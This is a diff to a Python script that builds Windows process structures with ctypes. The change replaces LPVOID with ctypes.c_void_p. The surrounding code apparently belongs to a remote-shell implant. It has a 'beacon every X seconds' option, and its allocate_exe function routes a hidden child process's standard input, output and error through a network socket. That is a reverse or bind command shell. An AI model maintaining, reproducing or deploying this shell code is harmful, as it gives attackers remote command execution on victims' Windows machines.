@@ -34,7 +34,7 @@ import ctypes
 import time
 import signal
 import struct
-from ctypes.wintypes import DWORD, HANDLE, LPVOID, WORD
+from ctypes.wintypes import DWORD, HANDLE, WORD
 
 #Set to True if you want to beacon every X seconds based
 #on timesleep
@@ -63,9 +63,9 @@ class PROCESS_INFORMAION(ctypes.Structure):
 class STARTUPINFO(ctypes.Structure):
 
     _fields_ = [('cb', DWORD),
-              ('lpReserved', LPVOID),
-              ('lpDesktop', LPVOID),
-              ('lpTitle', LPVOID),
+              ('lpReserved', ctypes.c_void_p),
+              ('lpDesktop', ctypes.c_void_p),
+              ('lpTitle', ctypes.c_void_p),
               ('dwX', DWORD),
               ('dwY', DWORD),
               ('dwXSize', DWORD),
@@ -76,7 +76,7 @@ class STARTUPINFO(ctypes.Structure):
               ('dwFlags', DWORD),
               ('wShowWindow', WORD),
               ('cbReserved2', WORD),
-              ('lpReserved2', LPVOID),
+              ('lpReserved2', ctypes.c_void_p),
               ('hStdInput', HANDLE),
               ('hStdOutput', HANDLE),
               ('hStdError', HANDLE)
@@ -146,10 +146,10 @@ def allocate_exe():
                                              )
 
     sInfo = STARTUPINFO()
-    sInfo.cb = LPVOID(0)
-    sInfo.lpReserved = LPVOID(0)
-    sInfo.lpDesktop = LPVOID(0)
-    sInfo.lpTitle = LPVOID(0)
+    sInfo.cb = ctypes.c_void_p(0)
+    sInfo.lpReserved = ctypes.c_void_p(0)
+    sInfo.lpDesktop = ctypes.c_void_p(0)
+    sInfo.lpTitle = ctypes.c_void_p(0)
     sInfo.dwX = DWORD(0)
     sInfo.dwY = DWORD(0)
     sInfo.dwXSize = DWORD(0)
@@ -160,7 +160,7 @@ def allocate_exe():
     sInfo.dwFlags = DWORD(257)
     sInfo.wShowWindow = WORD(0)
     sInfo.cbReserved2 = WORD(0)
-    sInfo.lpReserved2 = LPVOID(0)
+    sInfo.lpReserved2 = ctypes.c_void_p(0)
     sInfo.hStdError = newSocket
     sInfo.hStdOutput = newSocket
     sInfo.hStdInput = newSocket
